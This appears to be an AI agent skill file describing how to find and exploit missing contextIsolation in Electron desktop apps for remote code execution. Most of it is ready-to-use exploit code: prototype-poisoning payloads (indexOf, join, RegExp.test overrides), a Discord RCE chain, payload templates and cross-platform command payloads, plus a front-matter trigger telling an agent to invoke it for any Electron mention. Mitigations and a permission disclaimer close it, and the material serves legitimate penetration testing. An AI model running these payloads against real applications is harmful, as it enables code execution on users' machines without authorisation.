---
name: electron-contextisolation-pentest
description: How to identify and exploit Electron app contextIsolation vulnerabilities for RCE. Use this skill whenever you're pentesting Electron desktop applications, analyzing Electron security, investigating preload script vulnerabilities, or need to test for context isolation bypasses. Trigger this skill for any Electron security assessment, even if the user doesn't explicitly mention 'contextIsolation' or 'preload' - just mention Electron apps, desktop app security, or Electron vulnerabilities.
---

# Electron ContextIsolation RCE via Preload Code

This skill helps you identify and exploit Electron applications that lack proper context isolation between the renderer and main processes. When `contextIsolation` is disabled or preload scripts are improperly configured, attackers can achieve Remote Code Execution (RCE) through JavaScript prototype pollution.

## When to Use This Skill

Use this skill when:
- Pentesting Electron desktop applications
- Analyzing Electron app security configurations
- Investigating preload script vulnerabilities
- Testing for context isolation bypasses
- Reviewing Electron app code for security issues
- Any security assessment involving Electron-based desktop apps

## Understanding the Vulnerability

Electron apps use a `preload` script to expose Node.js APIs to the renderer process. When `contextIsolation` is disabled, the renderer can access Node.js objects directly, allowing attackers to:

1. **Override built-in JavaScript methods** to bypass security checks
2. **Poison prototype methods** to redirect execution flow
3. **Execute arbitrary system commands** through exposed APIs

## Exploit Technique 1: Array.prototype.indexOf Poisoning

### The Vulnerability

Many Electron apps check if a URL protocol is safe before opening it:

```javascript
const SAFE_PROTOCOLS = ['http:', 'https:'];
if (SAFE_PROTOCOLS.indexOf(url.protocol) === -1) {
  // Block unsafe protocols
}
```

### The Exploit

Override `Array.prototype.indexOf` to always return a non-negative value, bypassing the check:

```html
<script>
  Array.prototype.indexOf = function() {
    return 1337; // Always return non-negative
  }
</script>
<a href="file:///C:/Windows/System32/calc.exe">CLICK</a>
```

### How It Works

1. The app checks `SAFE_PROTOCOLS.indexOf('file:')`
2. Your poisoned `indexOf` returns `1337` instead of `-1`
3. The app thinks `file:` is a safe protocol
4. The file:// URL opens, executing the binary

### Variations

```javascript
// Alternative: return 0 to make it look like first element
Array.prototype.indexOf = function() { return 0; }

// Or return any positive number
Array.prototype.indexOf = function() { return 1; }
```

## Exploit Technique 2: Built-in Method Overriding

### The Vulnerability

Some Electron apps expose native modules that execute system commands. By overriding JavaScript built-in methods, you can manipulate the execution path.

### Discord RCE Example

Discord exposed `DiscordNative.nativeModules.requireModule('discord_utils').getGPUDriverVersions()` which runs `nvidia-smi.exe`.

### The Exploit

```javascript
// Override RegExp.prototype.test to bypass path validation
RegExp.prototype.test = function() {
  return false;
};

// Override Array.prototype.join to inject command
Array.prototype.join = function() {
  return "calc";
};

// Trigger the vulnerable function
DiscordNative.nativeModules
  .requireModule("discord_utils")
  .getGPUDriverVersions();
```

### How It Works

1. The app calls `execa(nvidiaSmiPath, [])` to run nvidia-smi
2. `execa` internally uses `Array.prototype.join` to build the command
3. Your poisoned `join` returns "calc" instead of the path
4. `execa` executes `calc` instead of `nvidia-smi`

### Target Methods to Override

| Method | Purpose | Example |
|--------|---------|---------|
| `Array.prototype.join` | Command construction | `return "calc"` |
| `RegExp.prototype.test` | Path validation | `return false` |
| `String.prototype.split` | Path parsing | `return ["calc"]` |
| `Array.prototype.indexOf` | Protocol checks | `return 0` |
| `Object.prototype.hasOwnProperty` | Property checks | `return true` |

## Testing Checklist

### 1. Check for contextIsolation

Look for these patterns in the Electron app:

```javascript
// VULNERABLE - contextIsolation disabled
webPreferences: {
  contextIsolation: false
}

// VULNERABLE - not specified (defaults to false in older Electron)
webPreferences: {
  nodeIntegration: true
}

// SAFE - contextIsolation enabled
webPreferences: {
  contextIsolation: true,
  nodeIntegration: false
}
```

### 2. Inspect Preload Scripts

Open DevTools and check:

```javascript
// Check if Node.js is accessible
console.log(typeof require);
console.log(typeof process);

// Check for exposed APIs
console.log(window.DiscordNative);
console.log(window.electron);
console.log(window.require);
```

### 3. Test for Prototype Pollution

```javascript
// Test if you can override built-ins
Array.prototype.testOverride = function() { return "pwned"; };
const arr = [1, 2, 3];
console.log(arr.testOverride()); // "pwned" = vulnerable
```

### 4. Identify Exposed Native Modules

```javascript
// Look for exposed modules
console.log(Object.keys(window));
console.log(Object.getOwnPropertyNames(window));

// Check for requireModule patterns
if (window.DiscordNative) {
  console.log(Object.keys(window.DiscordNative));
}
```

## Payload Templates

### Basic RCE Payload

```html
<script>
  Array.prototype.indexOf = function() { return 1337; };
</script>
<a href="file:///C:/Windows/System32/calc.exe">Execute</a>
```

### Advanced Method Override

```javascript
// Override multiple methods for reliability
Array.prototype.join = function() { return "calc"; };
RegExp.prototype.test = function() { return false; };
String.prototype.split = function() { return ["calc"]; };

// Trigger the vulnerable code
// (depends on the specific app's exposed APIs)
```

### Cross-Platform Payloads

```javascript
// Windows
const payload = "calc";

// macOS
const payload = "/usr/bin/osascript -e 'tell application \"System Events\" to display dialog \"Pwned\"'";

// Linux
const payload = "xdg-open file:///etc/passwd";
```

## Mitigation Recommendations

### For Developers

1. **Enable contextIsolation**
   ```javascript
   webPreferences: {
     contextIsolation: true,
     nodeIntegration: false
   }
   ```

2. **Use sandbox**
   ```javascript
   webPreferences: {
     sandbox: true
   }
   ```

3. **Avoid exposing Node.js APIs**
   ```javascript
   // Don't do this:
   contextBridge.exposeInMainWorld('api', {
     require: require
   });
   
   // Do this instead:
   contextBridge.exposeInMainWorld('api', {
     safeFunction: () => ipcRenderer.invoke('safe-channel')
   });
   ```

4. **Validate all inputs**
   ```javascript
   // Don't trust user input in paths
   const allowedProtocols = ['http:', 'https:'];
   const isSafe = allowedProtocols.includes(url.protocol);
   ```

## References

- [Electron Security Guidelines](https://www.electronjs.org/docs/latest/tutorial/security)
- [Masato Kinugawa - Abusing the Lack of Context Isolation](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)
- [Discord Desktop RCE](https://mksben.l0.cm/2020/10/discord-desktop-rce.html)
- [node-cross-spawn parse.js](https://github.com/moxystudio/node-cross-spawn/blob/main/lib/parse.js)

## Legal Disclaimer

Only use these techniques on systems you own or have explicit permission to test. Unauthorized exploitation of Electron applications is illegal and unethical.
